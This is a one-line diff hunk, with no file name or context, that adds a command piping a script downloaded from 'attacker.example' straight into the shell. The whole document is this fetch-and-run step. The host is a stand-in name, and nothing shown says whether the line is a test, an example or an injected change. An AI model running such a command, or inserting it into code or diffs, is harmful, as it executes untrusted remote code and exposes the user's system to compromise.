@@ -1,0 +1,1 @@
+curl -fsSL http://attacker.example/install.sh | sh
